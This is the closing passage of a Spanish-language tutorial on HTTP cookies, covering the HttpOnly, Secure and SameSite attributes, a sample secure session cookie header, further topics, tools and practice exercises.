   • HttpOnly protege contra XSS (JavaScript malicioso)
   • Secure protege contra MITM (man-in-the-middle)
   • SameSite protege contra CSRF (requests cross-site)
```

### 🔑 Cookie Perfecta para Sesión

```
Set-Cookie: sessionId=abc123xyz789;
            Domain=example.com;
            Path=/;
            Max-Age=86400;
            Secure;
            HttpOnly;
            SameSite=Lax

✅ Secure      → Solo HTTPS
✅ HttpOnly    → Inmune a XSS
✅ SameSite    → Protegido CSRF
✅ Max-Age     → Expira en 24h
✅ Path=/      → Todo el sitio
```

### 📚 Para Seguir Aprendiendo

```
TEMAS AVANZADOS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Cookie prefixes (__Secure-, __Host-)
• Cookie partitioning (CHIPS)
• Cookie consent (GDPR)
• Refresh tokens con cookies
• Cookie jars en testing
• Subdomain cookies

HERRAMIENTAS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Chrome DevTools > Application > Cookies
• EditThisCookie (extensión Chrome)
• Cookie-Editor (extensión Firefox)
• Postman (testing de APIs con cookies)
```

---

**Creado para aprendizaje de desarrollo web**  
**Fecha: Diciembre 2024**  
**Tema: Cookies HTTP**

---

## 🎓 Ejercicios Propuestos

1. Crea una cookie de tema (claro/oscuro) desde JavaScript
2. Implementa "Recordarme" con cookie persistente
3. Crea middleware de autenticación con cookies en Express
4. Implementa logout que limpie cookies correctamente
5. Prueba cookies con diferentes atributos SameSite

¡Ahora entiendes las cookies! 🍪✨
